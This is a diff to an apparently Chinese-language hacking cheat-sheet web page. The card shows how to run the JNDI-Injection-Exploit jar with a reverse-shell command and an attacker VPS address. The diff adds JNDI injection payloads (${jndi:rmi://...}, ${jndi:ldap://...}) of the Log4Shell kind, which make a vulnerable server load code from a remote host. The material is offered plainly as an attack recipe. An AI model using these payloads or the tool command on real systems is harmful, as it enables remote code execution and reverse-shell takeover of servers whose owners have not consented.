@@ -121,8 +121,11 @@
                             <h1>常见使用</h1>
                         </div>
                         <div class="card-body">
-                            <h3>JNDI使用</h3>
+                            <h3>JNDI使用(使用后会生成相应poc)</h3>
                             <h4>java -jar <a href="../jar/jndi/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar">JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</a> -C "反弹shell命令" -A vps-ip</h4>
+                            <h3>POC</h3>
+                            <h4>${jndi:rmi://xxxxx:xxx/exp}</h4>
+                            <h4>${jndi:ldap://xxxxx:xxx/exp}</h4>
                         </div>
                     </div>
 
